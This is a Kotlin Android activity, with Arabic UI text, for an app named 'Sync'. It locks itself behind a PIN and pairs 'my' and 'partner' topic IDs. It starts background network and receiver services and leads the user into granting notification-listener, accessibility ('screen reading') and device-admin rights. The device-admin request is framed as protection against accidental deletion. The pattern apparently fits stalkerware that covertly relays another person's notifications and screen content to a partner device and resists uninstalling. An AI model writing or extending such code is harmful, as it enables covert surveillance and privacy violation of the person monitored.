package com.sync.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {

    private lateinit var db: DBHelper
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        db = DBHelper(this)

        // إذا في كلمة مرور محفوظة، نطلبها
        if (Prefs.password(this) != null) {
            askPassword()
        } else {
            // أول مرة: نطلب الإعداد
            if (!Prefs.isSetupDone(this)) {
                showSetupDialog()
            } else {
                showMainMenu()
            }
        }
    }

    // ---------- شاشة كلمة المرور ----------
    private fun askPassword() {
        val input = EditText(this).apply {
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
            hint = "كلمة المرور"
            gravity = Gravity.CENTER
        }

        AlertDialog.Builder(this)
            .setTitle("🔒 Sync")
            .setView(input)
            .setCancelable(false)
            .setPositiveButton("دخول") { _, _ ->
                if (input.text.toString() == Prefs.password(this)) {
                    showMainMenu()
                } else {
                    Toast.makeText(this, "كلمة المرور خطأ", Toast.LENGTH_SHORT).show()
                    finish()
                }
            }
            .setNegativeButton("خروج") { _, _ -> finish() }
            .show()
    }

    // ---------- شاشة الإعداد الأولي ----------
    private fun showSetupDialog() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 50, 50, 50)
        }

        val etMy = EditText(this).apply {
            hint = "موضوعي (My Topic)"
            setText("sync_h_2025_k9x2mq7p")
        }

        val etPartner = EditText(this).apply {
            hint = "موضوع الطرف الآخر (Partner Topic)"
            setText("sync_s_2025_w4n8tz3a")
        }

        val etPass = EditText(this).apply {
            hint = "كلمة المرور (أرقام فقط)"
            inputType = InputType.TYPE_CLASS_NUMBER
        }

        layout.addView(TextView(this).apply { text = "الإعداد الأولي" })
        layout.addView(etMy)
        layout.addView(etPartner)
        layout.addView(etPass)

        AlertDialog.Builder(this)
            .setTitle("🌹 Sync Setup")
            .setView(layout)
            .setCancelable(false)
            .setPositiveButton("حفظ") { _, _ ->
                val my = etMy.text.toString().trim()
                val partner = etPartner.text.toString().trim()
                val pass = etPass.text.toString().trim()

                if (my.isEmpty() || partner.isEmpty() || pass.length < 4) {
                    Toast.makeText(this, "أكمل جميع الحقول (كلمة المرور 4 أرقام على الأقل)", Toast.LENGTH_LONG).show()
                    finish()
                    return@setPositiveButton
                }

                Prefs.setTopics(this, my, partner)
                Prefs.setPassword(this, pass)
                Prefs.setSetupDone(this, true)

                requestPermissionsAndStart()
            }
            .show()
    }

    // ---------- طلب الصلاحيات وتشغيل الخدمات ----------
    private fun requestPermissionsAndStart() {
        // 1. تشغيل الخدمات
        val netIntent = Intent(this, NetService::class.java)
        val recvIntent = Intent(this, ReceiverService::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(netIntent)
            startForegroundService(recvIntent)
        } else {
            startService(netIntent)
            startService(recvIntent)
        }

        // 2. طلب صلاحية الإشعارات
        if (!isNotificationAccessGranted()) {
            AlertDialog.Builder(this)
                .setTitle("صلاحية الإشعارات")
                .setMessage("التطبيق يحتاج صلاحية الوصول إلى الإشعارات.\n\nسيتم نقلك إلى الإعدادات. ابحث عن \"Sync\" وفعّلها.")
                .setPositiveButton("موافق") { _, _ ->
                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                }
                .show()
        }

        // 3. طلب صلاحية إمكانية الوصول (Accessibility)
        AlertDialog.Builder(this)
            .setTitle("صلاحية قراءة الشاشة")
            .setMessage("التطبيق يحتاج صلاحية إمكانية الوصول (Accessibility).\n\nسيتم نقلك إلى الإعدادات. ابحث عن \"Sync\" وفعّلها.")
            .setPositiveButton("موافق") { _, _ ->
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .show()

        // 4. طلب صلاحية مدير الجهاز
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val comp = ComponentName(this, AdminReceiver::class.java)
        if (!dpm.isAdminActive(comp)) {
            AlertDialog.Builder(this)
                .setTitle("صلاحية مدير الجهاز")
                .setMessage("لمنع الحذف العرضي، يحتاج التطبيق صلاحية مدير الجهاز.")
                .setPositiveButton("موافق") { _, _ ->
                    startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                        .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                        .putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل الحماية"))
                }
                .show()
        }
    }

    // ---------- القائمة الرئيسية ----------
    private fun showMainMenu() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 40, 40, 40)
        }

        // عنوان
        layout.addView(TextView(this).apply {
            text = "🌹 Sync"
            textSize = 22f
            gravity = Gravity.CENTER
        })

        // حالة الاتصال
        val statusText = TextView(this).apply {
            text = "الحالة: شغال"
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 20)
        }
        layout.addView(statusText)

        // زر عرض السجل
        layout.addView(Button(this).apply {
            text = "📥 عرض السجل"
            setOnClickListener { showLog() }
        })

        // زر الإعدادات
        layout.addView(Button(this).apply {
            text = "⚙️ الإعدادات"
            setOnClickListener { showSettings() }
        })

        // زر مسح السجل
        layout.addView(Button(this).apply {
            text = "🗑️ مسح السجل"
            setOnClickListener {
                AlertDialog.Builder(this@MainActivity)
                    .setTitle("تأكيد")
                    .setMessage("هل أنت متأكد من مسح كل السجل؟")
                    .setPositiveButton("نعم") { _, _ ->
                        db.clearAll()
                        Toast.makeText(this@MainActivity, "تم المسح", Toast.LENGTH_SHORT).show()
                    }
                    .setNegativeButton("لا", null)
                    .show()
            }
        })

        // زر خروج
        layout.addView(Button(this).apply {
            text = "خروج"
            setOnClickListener { finish() }
        })

        AlertDialog.Builder(this)
            .setView(layout)
            .setCancelable(false)
            .show()
    }

    // ---------- عرض السجل ----------
    private fun showLog() {
        val entries = db.getAll()
        if (entries.isEmpty()) {
            AlertDialog.Builder(this)
                .setTitle("📥 السجل")
                .setMessage("السجل فاضي")
                .setPositiveButton("حسناً", null)
                .show()
            return
        }

        val scrollView = ScrollView(this)
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(30, 30, 30, 30)
        }

        for (entry in entries) {
            val tv = TextView(this).apply {
                text = "${dateFormat.format(Date(entry.timestamp))}\n${entry.title}\n${entry.body}\n─────────"
                setPadding(0, 15, 0, 15)
                textSize = 13f
            }
            layout.addView(tv)
        }

        scrollView.addView(layout)

        AlertDialog.Builder(this)
            .setTitle("📥 السجل (${entries.size})")
            .setView(scrollView)
            .setPositiveButton("إغلاق", null)
            .show()
    }

    // ---------- الإعدادات ----------
    private fun showSettings() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 50, 50, 50)
        }

        val etMy = EditText(this).apply {
            hint = "موضوعي"
            setText(Prefs.myTopic(this@MainActivity) ?: "")
        }

        val etPartner = EditText(this).apply {
            hint = "موضوع الطرف الآخر"
            setText(Prefs.partnerTopic(this@MainActivity) ?: "")
        }

        val etPass = EditText(this).apply {
            hint = "كلمة مرور جديدة (اتركها فاضية للإبقاء)"
            inputType = InputType.TYPE_CLASS_NUMBER
        }

        layout.addView(TextView(this).apply { text = "موضوعي:" })
        layout.addView(etMy)
        layout.addView(TextView(this).apply { text = "موضوع الطرف الآخر:" })
        layout.addView(etPartner)
        layout.addView(TextView(this).apply { text = "كلمة المرور:" })
        layout.addView(etPass)

        AlertDialog.Builder(this)
            .setTitle("⚙️ الإعدادات")
            .setView(layout)
            .setPositiveButton("حفظ") { _, _ ->
                val my = etMy.text.toString().trim()
                val partner = etPartner.text.toString().trim()
                val pass = etPass.text.toString().trim()

                if (my.isNotEmpty() && partner.isNotEmpty()) {
                    Prefs.setTopics(this, my, partner)
                }
                if (pass.isNotEmpty()) {
                    Prefs.setPassword(this, pass)
                }

                // إعادة تشغيل الخدمات عشان تاخد الإعدادات الجديدة
                stopService(Intent(this, ReceiverService::class.java))
                stopService(Intent(this, NetService::class.java))
                requestPermissionsAndStart()

                Toast.makeText(this, "تم الحفظ", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }

    // ---------- فحص صلاحية الإشعارات ----------
    private fun isNotificationAccessGranted(): Boolean {
        val flat = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        return flat.contains(packageName)
    }
}
